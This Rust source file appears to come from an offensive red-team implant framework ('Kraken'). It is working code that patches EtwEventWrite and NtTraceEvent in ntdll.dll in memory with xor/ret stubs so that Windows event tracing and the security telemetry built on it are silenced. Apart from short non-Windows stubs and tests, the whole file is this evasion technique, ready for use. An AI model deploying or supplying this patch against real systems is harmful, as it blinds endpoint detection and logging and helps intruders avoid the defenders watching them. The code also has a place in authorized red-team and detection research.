//! ETW (Event Tracing for Windows) patching — Phase 4 OPSEC
//!
//! Patches EtwEventWrite and NtTraceEvent to disable telemetry.
//! Detection rules: wiki/detection/yara/kraken_opsec.yar

use common::KrakenError;

#[cfg(target_os = "windows")]
use core::ffi::c_void;
#[cfg(target_os = "windows")]
use windows_sys::Win32::System::LibraryLoader::{GetModuleHandleA, GetProcAddress};
#[cfg(target_os = "windows")]
use windows_sys::Win32::System::Memory::{VirtualProtect, PAGE_EXECUTE_READWRITE};

/// ETW patch status
#[derive(Debug, Clone, Copy, Default)]
pub struct EtwStatus {
    pub etw_event_write_patched: bool,
    pub nt_trace_event_patched: bool,
}

/// Patch EtwEventWrite to return STATUS_SUCCESS immediately
///
/// This patches the function in ntdll.dll to:
/// ```asm
/// xor eax, eax  ; 33 C0 - set return value to 0 (STATUS_SUCCESS)
/// ret           ; C3    - return immediately
/// ```
///
/// # Safety
/// This modifies code in ntdll.dll. Only call in authorized testing scenarios.
#[cfg(target_os = "windows")]
pub unsafe fn patch_etw_event_write() -> Result<(), KrakenError> {
    // Get ntdll handle
    let ntdll = GetModuleHandleA(b"ntdll.dll\0".as_ptr());
    if ntdll == 0 {
        return Err(KrakenError::Module("ntdll.dll not found".into()));
    }

    // Get EtwEventWrite address
    let etw_write = GetProcAddress(ntdll, b"EtwEventWrite\0".as_ptr());
    if etw_write.is_none() {
        return Err(KrakenError::Module("EtwEventWrite not found".into()));
    }
    let etw_write = etw_write.unwrap() as *mut u8;

    // Patch bytes: xor eax, eax; ret (returns STATUS_SUCCESS)
    let patch: [u8; 3] = [0x33, 0xC0, 0xC3];

    // Change memory protection to allow writing
    let mut old_protect: u32 = 0;
    let result = VirtualProtect(
        etw_write as *const c_void,
        patch.len(),
        PAGE_EXECUTE_READWRITE,
        &mut old_protect,
    );

    if result == 0 {
        return Err(KrakenError::Module("VirtualProtect failed".into()));
    }

    // Write patch
    core::ptr::copy_nonoverlapping(patch.as_ptr(), etw_write, patch.len());

    // Restore original protection
    VirtualProtect(
        etw_write as *const c_void,
        patch.len(),
        old_protect,
        &mut old_protect,
    );

    tracing::info!("ETW: EtwEventWrite patched successfully");
    Ok(())
}

/// Patch NtTraceEvent to return STATUS_SUCCESS immediately
///
/// This is a lower-level function that EtwEventWrite may call.
/// Patching both provides defense in depth.
///
/// Patch bytes:
/// ```asm
/// xor rax, rax  ; 48 33 C0 - set return value to 0 (STATUS_SUCCESS)
/// ret           ; C3       - return immediately
/// ```
///
/// # Safety
/// This modifies code in ntdll.dll. Only call in authorized testing scenarios.
#[cfg(target_os = "windows")]
pub unsafe fn patch_nt_trace_event() -> Result<(), KrakenError> {
    // Get ntdll handle
    let ntdll = GetModuleHandleA(b"ntdll.dll\0".as_ptr());
    if ntdll == 0 {
        return Err(KrakenError::Module("ntdll.dll not found".into()));
    }

    // Get NtTraceEvent address
    let nt_trace = GetProcAddress(ntdll, b"NtTraceEvent\0".as_ptr());
    if nt_trace.is_none() {
        return Err(KrakenError::Module("NtTraceEvent not found".into()));
    }
    let nt_trace = nt_trace.unwrap() as *mut u8;

    // Patch bytes: xor rax, rax; ret (returns STATUS_SUCCESS)
    // Using 64-bit xor for consistency with x64 calling convention
    let patch: [u8; 4] = [0x48, 0x33, 0xC0, 0xC3];

    // Change memory protection
    let mut old_protect: u32 = 0;
    let result = VirtualProtect(
        nt_trace as *const c_void,
        patch.len(),
        PAGE_EXECUTE_READWRITE,
        &mut old_protect,
    );

    if result == 0 {
        return Err(KrakenError::Module("VirtualProtect failed".into()));
    }

    // Write patch
    core::ptr::copy_nonoverlapping(patch.as_ptr(), nt_trace, patch.len());

    // Restore original protection
    VirtualProtect(
        nt_trace as *const c_void,
        patch.len(),
        old_protect,
        &mut old_protect,
    );

    tracing::info!("ETW: NtTraceEvent patched successfully");
    Ok(())
}

/// Patch all ETW-related functions
///
/// # Safety
/// This modifies code in ntdll.dll. Only call in authorized testing scenarios.
#[cfg(target_os = "windows")]
pub unsafe fn patch_all_etw() -> Result<EtwStatus, KrakenError> {
    let mut status = EtwStatus::default();

    // Patch EtwEventWrite
    match patch_etw_event_write() {
        Ok(()) => status.etw_event_write_patched = true,
        Err(e) => tracing::warn!("Failed to patch EtwEventWrite: {}", e),
    }

    // Patch NtTraceEvent
    match patch_nt_trace_event() {
        Ok(()) => status.nt_trace_event_patched = true,
        Err(e) => tracing::warn!("Failed to patch NtTraceEvent: {}", e),
    }

    // Return error if neither succeeded
    if !status.etw_event_write_patched && !status.nt_trace_event_patched {
        return Err(KrakenError::Module("All ETW patches failed".into()));
    }

    Ok(status)
}

// =============================================================================
// Non-Windows stubs
// =============================================================================

#[cfg(not(target_os = "windows"))]
pub fn patch_etw_event_write() -> Result<(), KrakenError> {
    Err(KrakenError::Module(
        "ETW patching only supported on Windows".into(),
    ))
}

#[cfg(not(target_os = "windows"))]
pub fn patch_nt_trace_event() -> Result<(), KrakenError> {
    Err(KrakenError::Module(
        "ETW patching only supported on Windows".into(),
    ))
}

#[cfg(not(target_os = "windows"))]
pub fn patch_all_etw() -> Result<EtwStatus, KrakenError> {
    Err(KrakenError::Module(
        "ETW patching only supported on Windows".into(),
    ))
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn test_etw_status_default() {
        let status = EtwStatus::default();
        assert!(!status.etw_event_write_patched);
        assert!(!status.nt_trace_event_patched);
    }

    #[test]
    #[cfg(not(target_os = "windows"))]
    fn test_patch_etw_event_write_non_windows() {
        let result = patch_etw_event_write();
        assert!(result.is_err());
    }

    #[test]
    #[cfg(not(target_os = "windows"))]
    fn test_patch_nt_trace_event_non_windows() {
        let result = patch_nt_trace_event();
        assert!(result.is_err());
    }

    #[test]
    #[cfg(not(target_os = "windows"))]
    fn test_patch_all_etw_non_windows() {
        let result = patch_all_etw();
        assert!(result.is_err());
    }

    // Windows-specific tests would require running in a Windows environment
    // and are marked as integration tests in tests/integration/phase4.rs
}
